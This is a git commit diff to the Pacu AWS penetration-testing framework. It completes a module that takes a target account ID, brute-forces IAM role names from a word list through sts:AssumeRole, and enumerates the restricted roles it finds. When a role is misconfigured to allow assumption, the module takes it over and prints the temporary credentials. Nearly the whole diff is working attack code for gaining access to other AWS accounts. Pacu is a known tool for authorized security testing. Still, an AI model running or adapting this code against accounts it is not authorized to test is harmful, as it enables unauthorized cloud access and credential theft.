e4519f6902adc9aa0a70dae5ff775bc16357e869
Spencer Gietzen <spencer@spengietz.com>
2018-08-21 15:45:02 -0700

    added a default word list and finished bruteforce_assume_role

--- modules/bruteforce_assume_role/main.py
+++ modules/bruteforce_assume_role/main.py
@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 import argparse
-from botocore.exceptions import ClientError
-import os
+import botocore
+import random
+import string
 
 
 module_info = {
@@ -13,7 +14,7 @@ module_info = {
 
     'one_liner': 'Bruteforces existing roles in other AWS accounts to try and gain access via misconfigurations.',
 
-    'description': 'This module takes in an AWS account ID and tries to bruteforce role names within that account. If one is discovered and it is misconfigured to allow role-assumption from a wide group, it is possible to assume that role and gain access to that AWS account through this method. NOTE: This module is listed under the recon_enum_no_keys category because it is not recommended to use compromised keys to run this module. This module DOES require a set of AWS keys, but it will spam CloudTrail logs with "AssumeRole" logs, so it is suggested to use a personal account to run this.',
+    'description': 'This module takes in an AWS account ID and tries to bruteforce role names within that account. If one is discovered and it is misconfigured to allow role-assumption from a wide group, it is possible to assume that role and gain access to that AWS account through this method. NOTE: This module is listed under the recon_enum_no_keys category because it is not recommended to use compromised keys to run this module. This module DOES require a set of AWS keys, but it will spam CloudTrail logs with "AssumeRole" logs, so it is suggested to use a personal account to run this. The keys used must have the sts:AssumeRole permission on any resource.',
 
     'services': ['STS'],
 
@@ -37,7 +38,13 @@ def main(args, pacu_main):
     print = pacu_main.print
     input = pacu_main.input
 
-    client = pacu_main.get_boto3_client('sts')
+    data = {
+        'attempts': 0,
+        'enumerated': [],
+        'success': False
+    }
+
+    print('Targeting account ID: {}\n'.format(args.account_id))
 
     if args.word_list is None:
         word_list_path = './modules/{}/default-word-list.txt'.format(module_info['name'])
@@ -47,13 +54,61 @@ def main(args, pacu_main):
     with open(word_list_path, 'r') as f:
         word_list = f.read().splitlines()
 
+    client = pacu_main.get_boto3_client('sts')
+    for word in word_list:
+        role_arn = 'arn:aws:iam::{}:role/{}'.format(args.account_id, word)
+
+        data['attempts'] += 1
+
+        try:
+            response = client.assume_role(
+                RoleArn=role_arn,
+                RoleSessionName=''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(20)),
+                DurationSeconds=43200
+            )
+
+            print('Successfully assumed role for 12 hours: {}\n'.format(role_arn))
+
+            data['success'] = True
+            data['role_arn'] = role_arn
+            response.pop('ResponseMetadata', None)
+            print(response)
+
+            break
+        except botocore.exceptions.ClientError as error:
+            if 'The requested DurationSeconds exceeds the MaxSessionDuration set for this role.' in str(error):
+                print('Vulnerable role found: {}!'.format(role_arn))
+                print('  Hit max session time limit, reverting to minimum of 1 hour...\n')
+
+                response = client.assume_role(
+                    RoleArn=role_arn,
+                    RoleSessionName=''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(20)),
+                    DurationSeconds=3600
+                )
+
+                print('Successfully assumed role: {}\n'.format(role_arn))
+
+                data['success'] = True
+                data['role_arn'] = role_arn
+                response.pop('ResponseMetadata', None)
+                print(response)
+
+                break
+            elif 'Not authorized to perform sts:AssumeRole' in str(error):
+                # Role not found
+                pass
+            elif 'is not authorized to perform: sts:AssumeRole on resource' in str(error):
+                # Role found, but not allowed to assume
+                print('Found role: {}'.format(role_arn))
+                data['enumerated'].append(role_arn)
+                print('  Not allowed to assume it.\n')
 
     print('{} completed.\n'.format(module_info['name']))
     return data
 
 
 def summary(data, pacu_main):
-    if 'success' in data.keys() and 'role_arn' in data.keys():
-        return 'Successfully found a role we can assume after {} attempts: {}.'.format(data['attempts'], data['role_arn'])
+    if 'success' in data.keys() and data['success'] is True:
+        return 'Successfully found a role we can assume after {} attempts: {}\nEnumerated {} restricted role(s): {}'.format(data['attempts'], data['role_arn'], len(data['enumerated']), data['enumerated'])
     else:
-        return 'Did not find a role to assume after {} attempts.'.format(data['attempts'])
+        return 'Did not find a role to assume after {} attempts.\nEnumerated {} restricted role(s): {}'.format(data['attempts'], len(data['enumerated']), data['enumerated'])
